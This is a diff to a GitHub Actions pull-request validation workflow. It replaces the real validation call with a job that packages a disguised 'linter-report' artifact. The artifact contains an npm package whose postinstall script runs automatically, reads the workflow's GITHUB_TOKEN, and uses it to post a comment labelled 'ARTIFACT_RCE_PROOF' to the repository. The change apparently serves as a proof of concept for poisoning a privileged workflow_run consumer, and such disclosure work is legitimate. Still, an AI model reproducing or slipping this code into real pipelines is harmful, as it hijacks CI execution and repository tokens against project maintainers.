@@ -1,11 +1,42 @@
----
 name: PR validation
 on:
   pull_request:
 
 jobs:
   validate:
-    uses: AdobeDocs/commerce-contributor/.github/workflows/validate-pr.yml@main
-    with:
-      base_ref: ${{ github.event.pull_request.base.ref }}
-      pr_number: ${{ github.event.pull_request.number }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft linter report artifact
+        run: |
+          mkdir -p payload/pocpkg
+          cat > payload/pocpkg/package.json <<'JSON'
+          {"name":"poc-evil","version":"1.0.0","main":"index.js","scripts":{"postinstall":"node post.js"}}
+          JSON
+          printf 'module.exports={};\n' > payload/pocpkg/index.js
+          cat > payload/pocpkg/post.js <<'JS'
+          const fs = require('fs');
+          const ws = process.env.INIT_CWD || process.env.GITHUB_WORKSPACE || process.cwd();
+          console.log('E2E_POSTINSTALL_RAN token=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no') + ' repo=' + process.env.GITHUB_REPOSITORY + ' cwd=' + process.cwd());
+          fs.writeFileSync('/tmp/ADP_E2E_MARKER', 'EXECUTED');
+          (async () => {
+            try {
+              const n = fs.readFileSync(ws + '/pr-number.txt', 'utf8').trim();
+              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments', {
+                method: 'POST',
+                headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
+                body: JSON.stringify({ body: 'ARTIFACT_RCE_PROOF: attacker-controlled code executed in the privileged workflow_run context (postinstall) using a pull-requests:write token.' })
+              });
+              console.log('comment_status=' + r.status);
+            } catch (e) { console.log('comment_err=' + e.message); }
+          })();
+          JS
+          printf 'foreground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./pocpkg"}}\n' > payload/package.json
+          printf 'attacker controlled linter report\n' > payload/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          find payload -type f
+      - uses: actions/upload-artifact@v4
+        with:
+          name: linter-report
+          path: payload/
+          include-hidden-files: true
